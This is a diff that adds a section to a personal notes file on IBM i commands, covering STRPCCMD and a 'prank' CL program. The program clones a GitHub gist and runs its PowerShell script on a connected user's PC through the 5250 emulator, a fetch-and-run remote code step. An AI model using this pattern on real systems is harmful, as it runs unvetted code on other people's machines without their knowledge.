@@ -151,3 +151,33 @@ qsh -c "liblist"
 
 ```
 
+
+## STRPCCMD
+One of the weirdest commands I've messed around with is STRPCCMD.
+It allows commands to be run on a user's machine from the 5250 emulator.
+
+Naturally, I decided to make a prank script that does a bunch of stuff to the user's machine.
+The full gist can be found here https://gist.github.com/barrettotte/b6654e5606831f13f48887de39d67723
+
+Since there is full access to a command prompt you can use any windows command you want.
+In this case I clone a powershell script and invoke it.
+
+```php
+/* JOKE.CLLE */
+
+PGM                                                              
+   DCL VAR(&gist) TYPE(*CHAR) LEN(60)                            
+   DCL VAR(&cmd)  TYPE(*CHAR) LEN(120)                           
+                                                                 
+   CHGVAR VAR(&gist) VALUE('https://gist.github.com/' +          
+             || 'b6654e5606831f13f48887de39d67723.git')          
+                                                                 
+   CHGVAR VAR(&cmd) VALUE('cmd /c "git clone ' || &gist || ' x' +
+                       || ' & powershell x/joke.ps1"')                           
+                                                                 
+   STRPCO PCTA(*NO)                                              
+   MONMSG MSGID(IWS4010)                                         
+   STRPCCMD PCCMD(&cmd) PAUSE(*NO)                               
+                               
+ENDPGM
+```
